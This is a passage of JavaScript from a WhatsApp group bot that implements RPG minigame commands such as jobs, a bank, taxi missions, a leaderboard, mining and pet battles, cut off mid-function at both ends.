    let bengkel = bengke[Math.floor(Math.random() * bengke.length)]

    let ruma = ['Building a House', 'Constructing a Building', 'Repairing a House', 'Repairing a Building', 'Building Public Facilities', 'Repairing Public Facilities']
    let rumah = ruma[Math.floor(Math.random() * ruma.length)]

    if (/kerja/i.test(command)) {
        switch (type) {
            case 'ojek':
if (new Date - users.lastkerja < 300000) return replynano(`You've worked\nIt's time to take a break ${clockString(time - new Date())}`)
let hasilojek = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasilojek * 1
	              users.lastparming = new Date * 1
replynano(`You Have Delivered *${penumpang}* 🚗\nAnd get the money worth it *Rp ${hasilojek} ${global.rpg.emoticon('money')}*`)
break
            case 'pedagang':
if (new Date - users.lastkerja < 300000) return replynano(`You've worked, it's time to take a break\n🕜 ${clockString(time - new Date())}`)
let hasildagang = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasildagang * 1
	              users.lastparming = new Date * 1
replynano(`There are buyers who buy *${dagangan}* 🛒\nAnd get the money worth it *Rp ${hasildagang} ${global.rpg.emoticon('money')}*`)
break
            case 'dokter':
if (new Date - users.lastkerja < 300000) return replynano(`You've worked, it's time to take a break\n🕜 ${clockString(time - new Date())}`)
let hasildokter = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasildokter * 1
	              users.lastparming = new Date * 1
replynano(`You cure the patient *${pasien}* 💉\nAnd get the money worth it *Rp ${hasildokter}* ${global.rpg.emoticon('money')}`)
break
            case 'petani':
if (new Date - users.lastkerja < 300000) return replynano(`You've worked, it's time to take a break\n🕜 ${clockString(time - new Date())}`)
let hasiltani = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasiltani * 1
	              users.lastparming = new Date * 1
replynano(`${panen} It's been harvested!🌽 And sell it   \nAnd get the money worth Rp *${hasiltani} ${global.rpg.emoticon('money')}*`)
break
            case 'montir':
if (new Date - users.lastkerja < 300000) return replynano(`You've worked, it's time to take a break\n🕜 ${clockString(time - new Date())}`)
let hasilmontir = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasilmontir * 1
	              users.lastparming = new Date * 1
replynano(`You Just get a customer and improve *${bengkel} 🔧*\nAnd you get your money's worth *Rp ${hasilmontir}* ${global.rpg.emoticon('money')}`)
break
            case 'kuli':
if (new Date - users.lastkerja < 300000) return replynano(`You've worked, it's time to take a break\n🕜 ${clockString(time - new Date())}`)
let hasilkuli = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasilkuli * 1
	              users.lastparming = new Date * 1
replynano(`You just finished ${rumah} 🔨\nAnd get the money worth it *Rp ${hasilkuli} ${global.rpg.emoticon('money')}*`)
break
            default:
return replynano(`_*Choose the job you want*_\n\n_• Coolie_ \n_• Mechanic_ \n_• Farmer_ \n_• Doctor_ \n_• Trader_ \n_• Taxibike_ \n\nUsage Example :\ncoolie work`)
        }
    }
}}
break
//=========================================\\
  case 'bankcek':
case 'bank': { if (prefix === '.') {
    if (!m.isGroup) return reply(mess.only.group)
    let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0]: m.fromMe ? LordVoltage.user.jid: m.sender
    if (!(who in global.db.users)) return reply(`User ${who} not in database`)
    let user = global.db.users[who]
    let isMods = global.owner.filter(([number, _, isDeveloper]) => number && isDeveloper).map(([number]) => number).map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
    let DanzTheCreator = m.fromMe || isMods || [LordVoltage.decodeJid(LordVoltage.user.id), ...global.owner.filter(([number, _, DanzTheCreator]) => number && !DanzTheCreator).map(([number]) => number)].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
    let isPrems =  DanzTheCreator || new Date() - user.premiumTime < 0
    let caption = `
▧「 *BANK* 」
│ 🙂 Name: ${user.registered ? user.name: LordVoltage.getName(m.sender)}
│ ${global.rpg.emoticon('atm')} Atm: ${user.atm > 0 ? 'Level ' + user.atm: '✖️'}
│ ${global.rpg.emoticon('bank')} Bank: ${user.bank} / ${user.fullatm}
│ ${global.rpg.emoticon('money')} Money: ${user.money}
│ ${global.rpg.emoticon('chip')} Chip: ${user.chip}
│ 🤖 Robo: ${user.robo > 0 ? 'Level ' + user.robo: '✖️'}
│ 🌟 Status: ${isMods ? 'Developer' : DanzTheCreator ? 'Owner' : isPrem ? 'Premium User 🙂' : user.level > 999 ? 'Elite User' : 'Free User'}
│ 📑 Registered: ${user.registered ? 'Yes': 'No'}
└────···
`.trim()
    replynano(`${caption}`)
}}
break
//=========================================\\
case 'bansos':
case 'assist': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
  function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)];
  }

  function clockString(ms) {
    let h = Math.floor(ms / 3600000);
    let m = Math.floor(ms / 60000) % 60;
    let s = Math.floor(ms / 1000) % 60;
    return [h, m, s].map(v => v.toString().padStart(2, '0')).join(':');
  }

  let user = global.db.users[m.sender];
  let randomaku = Math.floor(Math.random() * 101);
  let randomkamu = Math.floor(Math.random() * 101);
  let __timers = new Date() - user.lastbansos;
  let _timers = 360 - __timers;
  let timers = clockString(_timers);

  if (user.money < 1000) {
    return replynano(`Your Money Must Be Above One Thousand To Use This Command`);
  }

  if (new Date() - user.lastbansos > 300000) {
    if (randomaku > randomkamu) {
      user.money -= 3000000;
      user.lastbansos = new Date() * 1;
      return LordVoltage.sendMessage(m.chat, {
        image: { url: 'https://telegra.ph/file/afcf9a7f4e713591080b5.jpg' },
        caption: `You were caught after you corrupted social assistance funds🕴️💰, and you have to pay a fine of 3 million rupiah💵`
      });
    } else if (randomaku < randomkamu) {
      user.money += 3000000;
      user.lastbansos = new Date() * 1;
      return LordVoltage.sendMessage(m.chat, {
        image: { url: 'https://telegra.ph/file/d31fcc46b09ce7bf236a7.jpg' },
        caption: `You succeeded in corrupting social assistance funds🕴️💰, and you got 3 million rupiah💵`
      });
    } else {
      user.lastbansos = new Date() * 1;
      return replynano(`Sorry, sɪʀ. You didn't succeed in social assistance corruption and didn't go to jail because you *ran away🏃*`);
    }
  } else {
    return replynano(`Please wait a few minutes for more social assistance`);
  }}
}
break;

//=========================================\\
case 'taxy':
case 'taxi': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
  function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let order = global.db.users[m.sender].ojekk
    let timers = clockString(_timers)
    let name = LordVoltage.getName(m.sender)
    let user = global.db.users[m.sender]
    let id = m.sender
    let kerja = 'Taxy'
    LordVoltage.misi = LordVoltage.misi ? LordVoltage.misi : {}
    if (id in LordVoltage.misi) {
        replynano(`Complete the Mission ${LordVoltage.misi[id][0]} Above all`)
        throw false
    }
    if (new Date - user.lastmisi > 3600000) {
        let randomaku1 = Math.floor(Math.random() * 1000000)
        let randomaku2 = Math.floor(Math.random() * 10000)
        
        var dimas = `
🚶⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️       🚕


✔️ Get orders....
`.trim()

        var dimas2 = `
🚶⬛⬛⬛⬛⬛🚐⬛⬛⬛🚓🚚
🚖⬜⬜⬜⬛⬜⬜⬜🚓⬛🚑
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛🚙
🏘️🏘️🏢️🌳  🌳 🏘️  🏘️🏡


🚖 Deliver to destination.....
`.trim()

        var dimas3 = `
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛🚓
⬛⬜🚗⬜⬜⬛⬜🚐⬜⬜⬛🚙🚚🚑
⬛⬛⬛⬛🚒⬛⬛⬛⬛⬛⬛🚚
🏘️🏘️🏘️🏘️🌳  🌳 🏘️


🚖 Finished Delivering Customers....
`.trim()

        var dimas4 = `
➕ 🙂Receive salary....
`.trim()

        var hsl = `
*—[ Hasil Taxy ${name} ]—*
➕ 🙂 Money = [ ${randomaku1} ]
➕ 🙂 Exp = [ ${randomaku2} ]
➕ 😍 Order Completed = +1
➕ 📥Total Previous Orders : ${order}
`.trim()

        user.money += randomaku1
        user.exp += randomaku2
        user.ojekk += 1
        
        LordVoltage.misi[id] = [
            kerja,
        setTimeout(() => {
            delete LordVoltage.misi[id]
        }, 27000)
        ]
        
        setTimeout(() => {
            replynano(`${hsl}`)
        }, 27000)

        setTimeout(() => {
            replynano(`${dimas4}`)
        }, 25000)

        setTimeout(() => {
            replynano(`${dimas3}`)
        }, 20000)

        setTimeout(() => {
            replynano(`${dimas2}`)
        }, 15000)

        setTimeout(() => {
            replynano(`${dimas}`)
        }, 10000)

        setTimeout(() => {
            replynano('🔍Mencari pelanggan.....')
        }, 0)
        user.lastmisi = new Date * 1
    } else replynano(`Please wait for ${timers}, to complete the mission again`)
}}
break
//=========================================\\
//=========================================\\
case 'leaderboard': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
const { areJidsSameUser } = require ('baileys')
function sort(property, ascending = true) {
  if (property) return (...args) => args[ascending & 1][property] - args[!ascending & 1][property]
  else return (...args) => args[ascending & 1] - args[!ascending & 1]
}

function toNumber(property, _default = 0) {
  if (property) return (a, i, b) => {
    return { ...b[i], [property]: a[property] === undefined ? _default : a[property] }
  }
  else return a => a === undefined ? _default : a
}

function enumGetKey(a) {
  return a.jid
}


/**
 * Detect Number
 * @param {Number} x 
 */
function isNumber(number) {
  if (!number) return number
  number = parseInt(number)
  return typeof number == 'number' && !isNaN(number)
}
const leaderboards = [
    'level',
    'exp',
    'limit',
    'money',
    'iron',
    'gold',
    'diamond',
    'emerald',
    'trash',
    'joinlimit',
    'potion',
    'petFood',
    'wood',
    'rock',
    'string',
    'common',
    'uncommon',
    'mythic',
    'legendary',
    'pet',
    'bank',
    'chip',
    'skata'
]
    let users = Object.entries(global.db.users).map(([key, value]) => {
        return {
            ...value, jid: key
        }
    })
    let imgr = getRandom()
    let leaderboard = leaderboards.filter(v => v && users.filter(user => user && user[v]).length)
    let type = (args[0] || '').toLowerCase()
    const getPage = (item) => Math.ceil((users.filter(user => user && user[item]).length) / 0)
    let wrong = `🔖 ᴛʏᴩᴇ ʟɪsᴛ :
${leaderboard.map(v => `
⮕ ${rpg.emoticon(v)} - ${v}
`.trim()).join('\n')}
––––––––––––––––––––––––
💁🏻‍♂ ᴛɪᴩ :
⮕ ᴛᴏ ᴠɪᴇᴡ ᴅɪғғᴇʀᴇɴᴛ ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ:
${command} [type]
★ ᴇxᴀᴍᴩʟᴇ:
${command} legendary`.trim()
    if (!leaderboard.includes(type))
        return await reply('*––––『 𝙻𝙴𝙰𝙳𝙴𝚁𝙱𝙾𝙰𝚁𝙳 』––––*\n' + wrong, {
        contextInfo: {
            
        }
    })
    let page = isNumber(args[1]) ? Math.min(Math.max(parseInt(args[1]), 0), getPage(type)): 0
    let sortedItem = users.map(toNumber(type)).sort(sort(type))
    let userItem = sortedItem.map(enumGetKey)
    // let len = args[0] && args[0].length > 0 ? Math.min(100, Math.max(parseInt(args[0]), 5)) : Math.min(5, sortedExp.length)
    let text = `
🏆 ʀᴀɴᴋ: ${userItem.indexOf(m.sender) + 1} ᴏᴜᴛ ᴏғ ${userItem.length}

                *• ${rpg.emoticon(type)} ${type} •*

${sortedItem.slice(page * 0, page * 5 + 5).map((user, i) => `${i + 1}.*﹙${user[type]}﹚*- ${participants.some(p => areJidsSameUser(user.jid, p.id)) ? `${user.registered ? user.name: LordVoltage.getName(user.jid)} \nwa.me/`: 'ғʀᴏᴍ ᴏᴛʜᴇʀ ɢʀᴏᴜᴩ\n @'}${user.jid.split`@`[0]}`).join`\n\n`}
`.trim()
    return await reply(text,{
        contextInfo: {
            mentionedJid: [...userItem.slice(page * 0, page * 5 + 5)].filter(v => !participants.some(p => areJidsSameUser(v, p.id))),
           
        }
    })
}}
break
//=========================================\\
case 'mulung':
case 'gloomy': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
  function msToTime(duration) {
    var milliseconds = parseInt((duration % 1000) / 100),
    seconds = Math.floor((duration / 1000) % 60),
    minutes = Math.floor((duration / (1000 * 60)) % 60),
    hours = Math.floor((duration / (1000 * 60 * 60)) % 24)
    hours = (hours < 10) ? "0" + hours : hours
    minutes = (minutes < 10) ? "0" + minutes : minutes
    seconds = (seconds < 10) ? "0" + seconds : seconds
    return hours + " hours " + minutes + " minutes " + seconds + " seconds"
}
    let user = global.db.users[m.sender]
    let time = user.lastmulung + 1800000

    if (new Date - user.lastmulung < 1800000) return replynano(`Anda sudah lelah untuk mulung\nWait for ${msToTime(time - new Date())} Again`)

    let botol = Math.floor(Math.random() * 1000)
    let kaleng = Math.floor(Math.random() * 1000)
    let kardus = Math.floor(Math.random() * 1000)
    let gelas = Math.floor(Math.random() * 1000)
    let plastik = Math.floor(Math.random() * 1000)

    user.botol += botol * 1
    user.kaleng += kaleng * 1
    user.kardus += kardus * 1
    user.gelas += gelas * 1
    user.plastik += plastik * 1
    user.lastmulung = new Date * 1

    replynano(`Congratulations you got it : \n+${botol} Bottle\n+${kaleng} Can\n+${kardus} Cardboard box\n+${gelas} Glass\n+${plastik} Plastic`)
}}
break
//=========================================\\
case 'mining': { if (prefix === '.') {
function reward(user = {}) {
    let rewards = {
        reward: {
            exp: 1000,
            trash: 101,
            string: 25,
            rock: 30,
            iron: 25,
            diamond: 10,
            emerald: 4,
            common: 2 * (user.dog && (user.dog > 2 ? 2 : user.dog) * 1.2 || 1),
            uncommon: [0, 0, 0, 1, 0].concat(
                new Array(5 - (
                    (user.dog > 2 && user.dog < 6 && user.dog) || (user.dog > 5 && 5) || 2
                )).fill(0)
            ),
            mythic: [0, 0, 0, 0, 0, 1, 0, 0, 0].concat(
                new Array(8 - (
                    (user.dog > 5 && user.dog < 8 && user.dog) || (user.dog > 7 && 8) || 3
                )).fill(0)
            ),
            legendary: [0, 0, 0, 0, 0, 0, 0, 1, 0, 0].concat(
                new Array(10 - (
                    (user.dog > 8 && user.dog) || 4
                )).fill(0)
            ),
            iron: [0, 0, 0, 1, 0, 0],
            gold: [0, 0, 0, 0, 0, 1, 0],
            diamond: [0, 0, 0, 0, 0, 0, 1, 0].concat(
                new Array(5 - (
                    (user.fox < 6 && user.fox) || (user.fox > 5 && 5) || 0
                )).fill(0)
            ),
        },
        lost: {
            health: 40 - user.cat * 4,
            pickaxedurability: 10
        }
    }
    return rewards
}
const cooldown = 300000;
    let user = global.db.users[m.sender];
    let timers = cooldown - (new Date() - user.lastmining);
    if (user.health < 80) {
        return reply(`
⚠️ Need at least 80 ❤️Healths to mine!! ⚠️
Please buy ❤️Healths first by typing *${usedPrefix}buy potion <amount>*,
and type *${usedPrefix}heal <amount>* to use the potion.
`.trim());
    }

    if (user.pickaxe == 0) {
        return reply('⛏️ You cant mine without a mining tool (pickaxe)! ⛏️');
    }

    if (new Date() - user.lastmining <= cooldown) {
        return reply(`
⏳ You've mined before! Please wait *${(timers / 1000).toFixed(2)} seconds* before mining again.
`.trim());
    }

    const rewards = reward(user);
    let text = 'You have mined and lost';
    for (const lost in rewards.lost) {
        if (user[lost]) {
            const total = rewards.lost[lost].getRandom();
            user[lost] -= total * 1;
            if (total) {
                text += `\n*${global.rpg.emoticon(lost)}${lost}:* ${total}`;
            }
        }
    }

    text += '\n\nBut you get it';
    for (const rewardItem in rewards.reward) {
        if (rewardItem in user) {
            const total = rewards.reward[rewardItem].getRandom();
            user[rewardItem] += total * 1;
            if (total) {
                text += `\n*${global.rpg.emoticon(rewardItem)}${rewardItem}:* ${total}`;
            }
        }
    }

    reply(text.trim());
    user.lastmining = new Date() * 1;
}}
break
case 'nabung':
case 'save': { if (prefix === '.') {
const xpperlimit = 1
	let user = global.db.users[m.sender]
  let count = command.replace(/^save/i, '')
  count = count ? /all/i.test(count) ? Math.floor(global.db.users[m.sender].money / xpperlimit) : parseInt(count) : args[0] ? parseInt(args[0]) : 1
  count = Math.max(1, count)
  if (user.atm == 0) return reply('You dont have an ATM yet !')
  if (user.bank > user.fullatm) return reply('Your bank is full!')
  if (count > user.fullatm - user.bank) return reply('The money doesnt fit in the bank')
  if (global.db.users[m.sender].money >= xpperlimit * count) {
    global.db.users[m.sender].money -= xpperlimit * count
    global.db.users[m.sender].bank += count
    reply(`Success in saving amount ${count} Money 🙂`)
  } else reply(`[❗] You don't have enough money to save ${count} money 🙂`)
}}
 break
case 'fightnaga':
  case 'dragon': { if (prefix === '.') {
    if (!m.isGroup) return reply(mess.only.group)
function Acakin(min,max){
  min = Math.ceil(min)
  max = Math.floor(max)
  return Math.floor(Math.random()*(max-min+1)) + min
}
let penumpan = ['mas mas', 'father', 'high school girl', 'little epep', 'mother']
    let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]
let nogo = ['mas mas', 'father', 'high school girl', 'little epep', 'mother']
    let nogorojo = penumpan[Math.floor(Math.random() * penumpan.length)]
LordVoltage.level = global.db.users[m.sender]
  LordVoltage.fightnaga = LordVoltage.fightnaga ? LordVoltage.fightnaga : {}
  const delay = time => new Promise(res=>setTimeout(res,time));

  if (typeof LordVoltage.fightnaga[m.sender] != "undefined" && LordVoltage.fightnaga[m.sender] == true) return reply(`*Can't fight ⚔️ because the Arena you own is used to fight your other pets.*`)

  let users = participants.map(a => a.id)
  var lawan
	lawan = users[Math.floor(users.length * Math.random())]
  while (typeof global.db.users[lawan] == "undefined" || lawan == m.sender){
    lawan = users[Math.floor(users.length * Math.random())]
  }

  let lamaPertarungan = Acakin(8,20)
  reply(`*Your Pet* (🐉dragon ${nogorojo} ) ⚔️challenge 🐉the dragon *${penumpang}* (🐉your dragon) is fighting.\n\nWait ${lamaPertarungan} more minutes and see who wins🎮.`)

  LordVoltage.fightnaga[m.sender] = true

  await delay(1000 * 60 * lamaPertarungan)

  let alasanKalah = ['Raise the level again😐','Cup','Not great','Dregs of pet','Rubbish pet']
  let alasanMenang = ['Great','Pro','Ganas Pet','Legend of Pet','Very Pro','Diligent in Feeding Pets']

  let kesempatan = []
  let i
  for (i=0;i<global.db.users[m.sender].naga;i++) kesempatan.push(m.sender)
  for (i=0;i<global.db.users[lawan].naga;i++) kesempatan.push(lawan)

  let pointPemain = 0
  let pointLawan = 0
  for (i=0;i<10;i++){
    unggul = Acakin(0,kesempatan.length-1)
    if (kesempatan[unggul] == m.sender) pointPemain += 1
    else pointLawan += 1
  }

  if (pointPemain > pointLawan){
    let hadiah = (pointPemain - pointLawan) * 20000
    global.db.users[m.sender].money += hadiah
    global.db.users[m.sender].tiketcoin += 1
    reply(`*${LordVoltage.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${LordVoltage.getName(lawan)}*\n\n*Pet🐉You* (dragon ${global.db.users[m.sender].naga}) WIN against the 🐉dragon *${LordVoltage.getName(lawan)}* (naga ${global.db.users[lawan].naga}) because of your dragon🐉 ${alasanMenang[Acakin(0,alasanMenang.length-1)]}\n\nPresent Rp. ${hadiah.toLocaleString()}\n+1 Tiketcoin`)
  }else if (pointPemain < pointLawan){
    let denda = (pointLawan - pointPemain) * 100000
    global.db.users[m.sender].money -= denda
    global.db.users[m.sender].tiketcoin += 1
    reply(`*${LordVoltage.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${LordVoltage.getName(lawan)}*\n\n*Pet🐉You* (dragon ${global.db.users[m.sender].naga}) LOST against the 🐉dragon *${LordVoltage.getName(lawan)}* (naga ${global.db.users[lawan].naga}) because of your pet ${alasanKalah[Acakin(0,alasanKalah.length-1)]}\n\nYour money is reduced by Rp. ${denda.toLocaleString()}\n+1 Tiketcoin`)
  }else {
    reply(`*${LordVoltage.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${LordVoltage.getName(lawan)}*\n\nIf you draw, you won't get anything 😂`)
  }

  delete LordVoltage.fightnaga[m.sender]
}}
break
case 'fightkyubi':
case 'kyubi': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
  function Acakin(min,max){
  min = Math.ceil(min)
  max = Math.floor(max)
  return Math.floor(Math.random()*(max-min+1)) + min
}
let penumpan = ['mas mas', 'father', 'high school girl', 'little epep', 'mother']
    let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]
let nogo = ['mas mas', 'mas mas', 'father', 'high school girl', 'little epep', 'mother']
    let nogorojo = penumpan[Math.floor(Math.random() * penumpan.length)]
LordVoltage.level = global.db.users[m.sender]
  LordVoltage.fightnaga = LordVoltage.fightnaga ? LordVoltage.fightnaga : {}
  const delay = time => new Promise(res=>setTimeout(res,time));

  if (typeof LordVoltage.fightnaga[m.sender] != "undefined" && LordVoltage.fightnaga[m.sender] == true) return reply(`*Can't fight ⚔️ because the Arena you own is used to fight your other pets.*`)

  let users = participants.map(u => u.id)
  var lawan
	lawan = users[Math.floor(users.length * Math.random())]
  while (typeof global.db.users[lawan] == "undefined" || lawan == m.sender){
    lawan = users[Math.floor(users.length * Math.random())]
  }

  let lamaPertarungan = Acakin(8,20)

  reply(`*Your Pet* (🦊kyubi ${penumpang}) ⚔️challenging his 🦊kyubi *${nogorojo}* (🦊your kyubi) is fighting.\n\nWait ${lamaPertarungan} more minutes and see who wins🎮.`)

  LordVoltage.fightnaga[m.sender] = true

  await delay(1000 * 60 * lamaPertarungan)

  let alasanKalah = ['Raise the level again😐','Cup','Not great','Dregs of pet','Rubbish pet']
  let alasanMenang = ['Great','Pro','Ganas Pet','Legend of Pet','Very Pro','Diligent in Feeding Pets']

  let kesempatan = []
  let i
  let unggul
  for (i=0;i<global.db.users[m.sender].kyubi;i++) kesempatan.push(m.sender)
  for (i=0;i<global.db.users[lawan].kyubi;i++) kesempatan.push(lawan)

  let pointPemain = 0
  let pointLawan = 0
  for (i=0;i<10;i++){
    unggul = Acakin(0,kesempatan.length-1)
    if (kesempatan[unggul] == m.sender) pointPemain += 1
    else pointLawan += 1
  }

  if (pointPemain > pointLawan){
    let hadiah = (pointPemain - pointLawan) * 20000
    global.db.users[m.sender].money += hadiah
    global.db.users[m.sender].tiketcoin += 1
    reply(`*${LordVoltage.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${LordVoltage.getName(lawan)}*\n\n*Pet🦊You* (kyubi ${global.db.users[m.sender].kyubi}) MENANG against his 🦊kyubi *${LordVoltage.getName(lawan)}* (kyubi ${global.db.users[lawan].kyubi}) because of your kyubi🦊 ${alasanMenang[Acakin(0,alasanMenang.length-1)]}\n\nPresent Rp. ${hadiah.toLocaleString()}\n+1 Tiketcoin`)
  }else if (pointPemain < pointLawan){
    let denda = (pointLawan - pointPemain) * 100000
    global.db.users[m.sender].money -= denda
    global.db.users[m.sender].tiketcoin += 1
    reply(`*${LordVoltage.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${LordVoltage.getName(lawan)}*\n\n*Pet🦊You* (kyubi ${global.db.users[m.sender].kyubi}) KALAH against his 🦊kyubi *${LordVoltage.getName(lawan)}* (kyubi ${global.db.users[lawan].kyubi}) because of your pet ${alasanKalah[Acakin(0,alasanKalah.length-1)]}\n\nYour money is reduced Rp. ${denda.toLocaleString()}\n+1 Tiketcoin`)
  }else {
    reply(`*${LordVoltage.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${LordVoltage.getName(lawan)}*\n\nIf you draw, you won't get anything 😂`)
  }

  delete LordVoltage.fightnaga[m.sender]
}}
break
case 'fightphonix':
case 'phoenix': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
  function Acakin(min,max){
  min = Math.ceil(min)
  max = Math.floor(max)
  return Math.floor(Math.random()*(max-min+1)) + min
}
let penumpan = ['mas mas', 'father', 'high school girl', 'little epep', 'mother']
    let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]
let nogo = ['mas mas', 'father', 'high school girl', 'little epep', 'mother']
    let nogorojo = penumpan[Math.floor(Math.random() * penumpan.length)]
LordVoltage.level = global.db.users[m.sender]
  LordVoltage.fightnaga = LordVoltage.fightnaga ? LordVoltage.fightnaga : {}
  const delay = time => new Promise(res=>setTimeout(res,time));

  if (typeof LordVoltage.fightnaga[m.sender] != "undefined" && LordVoltage.fightnaga[m.sender] == true) return reply(`*Can't fight ⚔️ because the Arena you own is used to fight your other pets.*`)

  let users = participants.map(u => u.id)
  var lawan
	lawan = users[Math.floor(users.length * Math.random())]
  while (typeof global.db.users[lawan] == "undefined" || lawan == m.sender){
    lawan = users[Math.floor(users.length * Math.random())]
  }

  let lamaPertarungan = Acakin(8,20)

  reply(`*Your Pet* (🦅phoenix ${penumpang}) ⚔️challenging his 🦅phonix *${nogorojo}* (🦅phoenix you) are fighting.\n\nWait ${lamaPertarungan} more minutes and see who wins🎮.`)

  LordVoltage.fightnaga[m.sender] = true

  await delay(1000 * 60 * lamaPertarungan)

  let alasanKalah = ['Raise the level again😐','Cup','Not great','Dregs of pet','Rubbish pet']
  let alasanMenang = ['Great','Pro','Ganas Pet','Legend of Pet','Very Pro','Diligent in Feeding Pets']

  let kesempatan = []
  for (i=0;i<global.db.users[m.sender].phonix;i++) kesempatan.push(m.sender)
  for (i=0;i<global.db.users[lawan].phonix;i++) kesempatan.push(lawan)

  let pointPemain = 0
  let pointLawan = 0
  for (i=0;i<10;i++){
    unggul = Acakin(0,kesempatan.length-1)
    if (kesempatan[unggul] == m.sender) pointPemain += 1
    else pointLawan += 1
  }

  if (pointPemain > pointLawan){
    let hadiah = (pointPemain - pointLawan) * 20000
    global.db.users[m.sender].money += hadiah
    global.db.users[m.sender].tiketcoin += 1
    reply(`*${LordVoltage.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${LordVoltage.getName(lawan)}*\n\n*Pet🦅You* (phonix ${global.db.users[m.sender].phonix}) WIN against his 🦅phonix *${LordVoltage.getName(lawan)}* (phonix ${global.db.users[lawan].phonix}) because of your phonix🦅 ${alasanMenang[Acakin(0,alasanMenang.length-1)]}\n\nGift Rp. ${hadiah.toLocaleString()}\n+1 Tiketcoin`)
  }else if (pointPemain < pointLawan){
    let denda = (pointLawan - pointPemain) * 10000
    global.db.users[m.sender].money -= denda
    global.db.users[m.sender].tiketcoin += 1
    reply(`*${LordVoltage.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${LordVoltage.getName(lawan)}*\n\n*Pet🦅You* (phonix ${global.db.users[m.sender].phonix}) LOSE the fight 🦅phonixnya *${LordVoltage.getName(lawan)}* (phonix ${global.db.users[lawan].phonix}) because of your pet${alasanKalah[Acakin(0,alasanKalah.length-1)]}\n\nYour money is reduced Rp. ${denda.toLocaleString()}\n+1 Tiketcoin`)
  }else {
    reply(`*${LordVoltage.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${LordVoltage.getName(lawan)}*\n\nIf you draw, you won't get anything 😂`)
  }

  delete LordVoltage.fightnaga[m.sender]
}}
break
case 'fightkucing':
case 'fightcat': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
  function Acakin(min,max){
  min = Math.ceil(min)
  max = Math.floor(max)
  return Math.floor(Math.random()*(max-min+1)) + min
}
let penumpan = ['mas mas', 'father', 'high school girl', 'little epep', 'mother']
    let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]
let nogo = ['mas mas', 'father', 'high school girl', 'little epep', 'mother']
    let nogorojo = penumpan[Math.floor(Math.random() * penumpan.length)]
LordVoltage.level = global.db.users[m.sender]
  LordVoltage.fightnaga = LordVoltage.fightnaga ? LordVoltage.fightnaga : {}
  const delay = time => new Promise(res=>setTimeout(res,time));

  if (typeof LordVoltage.fightnaga[m.sender] != "undefined" && LordVoltage.fightnaga[m.sender] == true) return reply(`*Cannot battle because you are currently using the arena you own .*`)

  let users = participants.map(u => u.id)
  var lawan
	lawan = users[Math.floor(users.length * Math.random())]
  while (typeof global.db.users[lawan] == "undefined" || lawan == m.sender){
    lawan = users[Math.floor(users.length * Math.random())]
  }

  let lamaPertarungan = Acakin(8,20)

  reply(`*Your Pet* (🐱cat ${penumpang}) challenged the 🐈cat *${nogorojo}* (🐱your cat) is fighting over his wife.\n\nWait ${lamaPertarungan} more minutes and see who wins🎮.`)

  LordVoltage.fightnaga[m.sender] = true

  await delay(1000 * 60 * lamaPertarungan)

  let alasanKalah = ['Raise the level again😐','Cup','Not great','Dregs of pet','Rubbish pet']
  let alasanMenang = ['Great','Pro','Ganas Pet','Legend of Pet','Very Pro','Diligent in Feeding Pets']

  let kesempatan = []
  for (i=0;i<global.db.users[m.sender].kucing;i++) kesempatan.push(m.sender)
  for (i=0;i<global.db.users[lawan].kucing;i++) kesempatan.push(lawan)

  let pointPemain = 0
  let pointLawan = 0
  for (i=0;i<10;i++){
    unggul = Acakin(0,kesempatan.length-1)
    if (kesempatan[unggul] == m.sender) pointPemain += 1
    else pointLawan += 1
  }

  if (pointPemain > pointLawan){
    let hadiah = (pointPemain - pointLawan) * 20000
    global.db.users[m.sender].money += hadiah
    global.db.users[m.sender].tiketcoin += 1
